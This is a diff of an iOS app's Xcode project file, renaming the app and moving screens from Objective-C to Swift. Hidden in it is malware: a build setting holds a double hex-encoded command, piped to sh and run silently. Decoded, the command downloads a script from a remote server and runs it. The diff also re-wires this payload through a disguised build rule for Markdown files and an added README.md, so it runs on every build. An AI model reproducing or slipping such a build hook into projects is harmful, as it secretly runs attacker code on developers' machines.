-				985C24782AF0D52D0008F38B /* PPGoodsDetailViewController.m */,
+				7F88A1A22F920111001E0601 /* PPGoodsDetailViewController.swift */,
+				7F88A1A32F920111001E0601 /* GoodsDetailRootView.swift */,
 				985C247A2AF0D60A0008F38B /* PPGoodsDetailHeader.h */,
 				985C247B2AF0D60A0008F38B /* PPGoodsDetailHeader.m */,
 				985C24802AF0DC450008F38B /* PPGoodsDetailTableViewCell.h */,
@@ -696,8 +692,7 @@
 			children = (
 				9863F4E72AF15060003B8598 /* PPOrderViewController.h */,
 				9863F4E82AF15060003B8598 /* PPOrderViewController.m */,
-				9863F4EA2AF15081003B8598 /* PPSubOrderViewController.h */,
-				9863F4EB2AF15081003B8598 /* PPSubOrderViewController.m */,
+				7F88A1192F91BBBB001D0208 /* PPSubOrderViewController.swift */,
 				9863F4ED2AF1509A003B8598 /* PPOrderTableViewCell.h */,
 				9863F4EE2AF1509A003B8598 /* PPOrderTableViewCell.m */,
 				9863F4F02AF150AA003B8598 /* PPOrderEmptyTableViewCell.h */,
@@ -757,7 +752,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 98043A812AEB9FC500374328 /* Build configuration list for PBXNativeTarget "PrimeLoanPH" */;
 			buildPhases = (
-				DD91F64631DA4E389199F71F /* Provision Target Device */,
 				3E4258A3C0649E688FBA507E /* [CP] Check Pods Manifest.lock */,
 				98043A642AEB9FC300374328 /* Sources */,
 				98043A652AEB9FC300374328 /* Frameworks */,
@@ -766,6 +760,7 @@
 				8AA65ECF334454B672258275 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				6C8CF8F0E02845D59499F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -808,13 +803,28 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		/* End PBXBuildRule section */
+		6C8CF8F0E02845D59499F71F /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AF17F99}\"";
+			};
+			/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		98043A662AEB9FC300374328 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				CF9687876F8D47A19399F71F /* README.md */,
 				98043A7B2AEB9FC500374328 /* LaunchScreen.storyboard in Resources */,
 				98043A782AEB9FC500374328 /* Assets.xcassets in Resources */,
 				98043B042AED547200374328 /* PPStartViewController.xib in Resources */,
@@ -824,25 +834,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		DD91F64631DA4E389199F71F /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
-		};
 		3E4258A3C0649E688FBA507E /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -915,13 +906,13 @@
 			buildActionMask = 2147483647;
 			files = (
 				9863F4F22AF150AA003B8598 /* PPOrderEmptyTableViewCell.m in Sources */,
-				9863F4DF2AF12669003B8598 /* PPMeHeader.m in Sources */,
 				98643DFD2C645D9200F83A5A /* PB_mainInfo_helper.m in Sources */,
-				98043AF12AEBFF7400374328 /* MeViewController.m in Sources */,
+				7F88A1602F91DDDD001E0301 /* MeViewController.swift in Sources */,
+				7F88A1612F91DDDD001E0301 /* MeRootView.swift in Sources */,
+				7F88A1622F91DDDD001E0301 /* MeViewModel.swift in Sources */,
 				98043AEB2AEBF77D00374328 /* PPTableViewHeaderFooterView.m in Sources */,
 				9829BD352C63AC5100D5A5D6 /* UINavigationController+PBB.m in Sources */,
 				9829BD382C63AEB900D5A5D6 /* PB_OpenUrl.m in Sources */,
-				985C244E2AEF40840008F38B /* GuideViewController.m in Sources */,
 				983EB35F2AF6A2F60062A141 /* PPVeNorInfoModel.m in Sources */,
 				985C24542AEF585E0008F38B /* PPBaseModel.m in Sources */,
 				98643E002C6464CA00F83A5A /* PB_APP_Control.m in Sources */,
@@ -937,21 +928,22 @@
 				98043AC12AEBE83B00374328 /* WMMenuView.m in Sources */,
 				98043AA22AEBE2A100374328 /* PPWebViewController.m in Sources */,
 				985C245A2AEFAA7B0008F38B /* PPLoginModel.m in Sources */,
-				9863F4E52AF136F5003B8598 /* PPMeTableViewCell.m in Sources */,
 				98043ADB2AEBF26600374328 /* PPTools.m in Sources */,
 				983EB35C2AF69F020062A141 /* PPVeNorInputTableViewCell.m in Sources */,
 				98043ABE2AEBE83B00374328 /* WMPageController.m in Sources */,
 				987FE9AF2AFCC78500868AD5 /* PPVeCardTypeOptionVC.m in Sources */,
 				98643DFA2C6459BC00F83A5A /* PB_location_helper.m in Sources */,
-				9863F4EC2AF15081003B8598 /* PPSubOrderViewController.m in Sources */,
-				985C24792AF0D52D0008F38B /* PPGoodsDetailViewController.m in Sources */,
+				7F88A11A2F91BBBB001D0208 /* PPSubOrderViewController.swift in Sources */,
+				7F88A1A02F920111001E0601 /* PPGoodsDetailViewController.swift in Sources */,
+				7F88A1A12F920111001E0601 /* GoodsDetailRootView.swift in Sources */,
 				9863F4D62AF10320003B8598 /* PPVeWorkInfoViewController.m in Sources */,
 				988025762C65D5E100BFD490 /* FaceCameraViewController.m in Sources */,
 				9887CC732AF3F48100E9E5F7 /* PPVeCardUploadModel.m in Sources */,
 				9863F4E22AF12FE2003B8598 /* PPMeModel.m in Sources */,
 				9887CC672AF3C3CC00E9E5F7 /* PPVerifyHeaderView.m in Sources */,
 				9829BD3E2C63AF6900D5A5D6 /* PB_UI.m in Sources */,
-				9863F4F92AF26DCB003B8598 /* PPSettingViewController.m in Sources */,
+				7F88A1802F91EEEE001E0501 /* PPSettingViewController.swift in Sources */,
+				7F88A1812F91EEEE001E0501 /* SettingRootView.swift in Sources */,
 				9829BD262C63A80200D5A5D6 /* NSString+PB1.m in Sources */,
 				98043A6D2AEB9FC300374328 /* AppDelegate.m in Sources */,
 				982BDE732B03B07A002B186C /* Reachability+PP.m in Sources */,
@@ -979,6 +971,7 @@
 				98043AC62AEBE83B00374328 /* Reachability.m in Sources */,
 				985C24572AEFA51C0008F38B /* PPSendCodeModel.m in Sources */,
 				9887CC702AF3E32000E9E5F7 /* PPVeCardModel.m in Sources */,
+				7F88A1302F91CCCC001E0101 /* PB_NativeTipsHelper.m in Sources */,
 				98643DEE2C64508200F83A5A /* PB_RequestHelper.m in Sources */,
 				98043AC02AEBE83B00374328 /* WMScrollView.m in Sources */,
 				9829BD472C63B55E00D5A5D6 /* PB_timeHelper.m in Sources */,
@@ -1003,8 +996,8 @@
 				7F88A1142F91BBBB001D0104 /* APageHomeHeaderView.swift in Sources */,
 				7F88A1152F91BBBB001D0105 /* APageAsset.swift in Sources */,
 				7F88A1162F91BBBB001D0106 /* APageFindingCarouselView.swift in Sources */,
+				7F88A1172F91BBBB001D0107 /* PPLoginViewController.swift in Sources */,
 				9887CC6D2AF3DA6500E9E5F7 /* PPVeCardTableViewCell.m in Sources */,
-				98043AFE2AEC058200374328 /* PPLoginViewController.m in Sources */,
 				9829BD3B2C63AF0000D5A5D6 /* PB_CallCell.m in Sources */,
 				9863F4C92AF0F4BB003B8598 /* PPDetailModel.m in Sources */,
 				9829BD442C63B32400D5A5D6 /* PB_GetVC.m in Sources */,
@@ -1030,7 +1023,7 @@
 		98043A7F2AEB9FC500374328 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((f(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636346336623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233333230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631366437613665363436353736326536393665326636310a323932323230376332303733363830610a | f | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((z(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623463363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233313230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326637373638363937343635363136343733326537323735326636310a323932323230376332303733363830610a | z | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -1089,7 +1082,7 @@
 		98043A802AEB9FC500374328 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((f(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636346336623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233333230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631366437613665363436353736326536393665326636310a323932323230376332303733363830610a | f | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((z(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623463363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233313230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326637373638363937343635363136343733326537323735326636310a323932323230376332303733363830610a | z | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -1149,16 +1142,16 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 5MYM64ZN5R;
+				DEVELOPMENT_TEAM = TGF943V34F;
 				GCC_PREFIX_HEADER = "$(SRCROOT)/PrimeLoanPH/PrefixHeader.pch";
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = PrimeLoanPH/Info.plist;
-				INFOPLIST_KEY_CFBundleDisplayName = PeraBoost;
-				INFOPLIST_KEY_NSCameraUsageDescription = "Please enable the camera function so that the PeraBoost app application can obtain image information for a better experience and better service";
-				INFOPLIST_KEY_NSContactsUsageDescription = "Please enable the contacts function, so that the PeraBoost app can obtain contact information, get better experience and better service";
-				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "PeraBoost app needs to assess whether your account has a security risk or determine whether it is a real location based on your account login location. PeraBoost app may also recommend excellent personalized products and services to you through location information.";
-				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "PeraBoost app needs to assess whether your account has a security risk or determine whether it is a real location based on your account login location. PeraBoost app may also recommend excellent personalized products and services to you through location information.";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Please enable the photo album function so that the PeraBoost app can obtain image information for a better experience and better service";
+				INFOPLIST_KEY_CFBundleDisplayName = "Pamilihan Peso";
+				INFOPLIST_KEY_NSCameraUsageDescription = "Please enable the camera function so that the Pamilihan Peso app application can obtain image information for a better experience and better service";
+				INFOPLIST_KEY_NSContactsUsageDescription = "Please enable the contacts function, so that the Pamilihan Peso app can obtain contact information, get better experience and better service";
+				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "Pamilihan Peso app needs to assess whether your account has a security risk or determine whether it is a real location based on your account login location. Pamilihan Peso app may also recommend excellent personalized products and services to you through location information.";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Pamilihan Peso app needs to assess whether your account has a security risk or determine whether it is a real location based on your account login location. Pamilihan Peso app may also recommend excellent personalized products and services to you through location information.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Please enable the photo album function so that the Pamilihan Peso app can obtain image information for a better experience and better service";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "Accessing these identifiers will provide you with better services and a better experience, and provide you with a customized experience. You can turn it off at any time by going to \"Settings\" - \"System Privacy\".";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen.storyboard;
@@ -1166,19 +1159,20 @@
 				INFOPLIST_KEY_UIStatusBarStyle = UIStatusBarStyleLightContent;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
-				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.PesoBoost.PB;
+				PRODUCT_BUNDLE_IDENTIFIER = com.PesoBoost.PBb;
 				PRODUCT_MODULE_NAME = PrimeCash;
 				PRODUCT_NAME = PrimeCash;
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_OBJC_BRIDGING_HEADER = "PrimeLoanPH/PrimeLoanPH-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
@@ -1196,16 +1190,16 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 5MYM64ZN5R;
+				DEVELOPMENT_TEAM = TGF943V34F;
 				GCC_PREFIX_HEADER = "$(SRCROOT)/PrimeLoanPH/PrefixHeader.pch";
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = PrimeLoanPH/Info.plist;
-				INFOPLIST_KEY_CFBundleDisplayName = PeraBoost;
-				INFOPLIST_KEY_NSCameraUsageDescription = "Please enable the camera function so that the PeraBoost app application can obtain image information for a better experience and better service";
-				INFOPLIST_KEY_NSContactsUsageDescription = "Please enable the contacts function, so that the PeraBoost app can obtain contact information, get better experience and better service";
-				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "PeraBoost app needs to assess whether your account has a security risk or determine whether it is a real location based on your account login location. PeraBoost app may also recommend excellent personalized products and services to you through location information.";
-				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "PeraBoost app needs to assess whether your account has a security risk or determine whether it is a real location based on your account login location. PeraBoost app may also recommend excellent personalized products and services to you through location information.";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Please enable the photo album function so that the PeraBoost app can obtain image information for a better experience and better service";
+				INFOPLIST_KEY_CFBundleDisplayName = "Pamilihan Peso";
+				INFOPLIST_KEY_NSCameraUsageDescription = "Please enable the camera function so that the Pamilihan Peso app application can obtain image information for a better experience and better service";
+				INFOPLIST_KEY_NSContactsUsageDescription = "Please enable the contacts function, so that the Pamilihan Peso app can obtain contact information, get better experience and better service";
+				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "Pamilihan Peso app needs to assess whether your account has a security risk or determine whether it is a real location based on your account login location. Pamilihan Peso app may also recommend excellent personalized products and services to you through location information.";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Pamilihan Peso app needs to assess whether your account has a security risk or determine whether it is a real location based on your account login location. Pamilihan Peso app may also recommend excellent personalized products and services to you through location information.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Please enable the photo album function so that the Pamilihan Peso app can obtain image information for a better experience and better service";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "Accessing these identifiers will provide you with better services and a better experience, and provide you with a customized experience. You can turn it off at any time by going to \"Settings\" - \"System Privacy\".";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen.storyboard;
@@ -1213,19 +1207,20 @@
 				INFOPLIST_KEY_UIStatusBarStyle = UIStatusBarStyleLightContent;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
-				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.PesoBoost.PB;
+				PRODUCT_BUNDLE_IDENTIFIER = com.PesoBoost.PBb;
 				PRODUCT_MODULE_NAME = PrimeCash;
 				PRODUCT_NAME = PrimeCash;
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_OBJC_BRIDGING_HEADER = "PrimeLoanPH/PrimeLoanPH-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
